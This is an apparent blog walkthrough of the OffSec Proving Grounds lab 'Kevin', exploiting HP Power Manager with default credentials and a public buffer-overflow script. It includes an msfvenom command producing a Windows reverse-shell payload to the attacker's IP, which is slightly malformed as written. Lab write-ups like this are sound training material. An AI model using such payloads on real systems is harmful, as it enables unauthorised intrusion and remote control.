---
title: Kevin
date: 2026-01-20T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - buffer-overflow
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Kevin"
---
	
nmap -A 

![](Screenshot%202025-12-14%20at%2013.08.33.png)

Log in to the http site using user:admin password:admin then try to find some exploits using the version number of the hp_power_manager 

![](Screenshot%202025-12-14%20at%2013.09.12.png)

I searched for: github exploit hp power manager 

This expoit didn't work. 

`python hp_pm_exploit_p3.py 192.168.108.45 80 4444`


this one did:

`https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py`

but...

 the buffer overflow code needs to be updated. 

this part:

![](Screenshot%202025-12-14%20at%2011.19.32.png)

for this you need to use the msfvenom command supplied just above it 

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.197 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f c`

replace the LHOST with you own machine. You also wont need to start up a listener. The exploit will do it for you. 

![](Pasted%20image%2020251214112707.png)

Take the new buffer overflow and replace the old from the exploit

![](Screenshot%202025-12-14%20at%2013.02.29.png)

![](Screenshot%202025-12-14%20at%2013.02.53.png)

Also. its python2

![](Screenshot%202025-12-14%20at%2011.22.52.png)

This is the error when you run `python`, by default python3 will be called.

It may fail and need the lab restarted. I have to restart it multiple times. 
	run a quick nmap `<IP> -p 80` to check the port is still open.  
	
![](Screenshot%202025-12-14%20at%2013.06.28.png)

![](Screenshot%202025-12-14%20at%2013.03.49.png)


This is the command to search the whole directory for a file. 
	dir \proof.txt /s /b

![](Screenshot%202025-12-14%20at%2011.17.13.png)
	helps if you know the file name. 
	
![](Screenshot%202025-12-14%20at%2011.17.53.png)

This took 11 hours for me to complete. Too long for an 'easy' lab. 
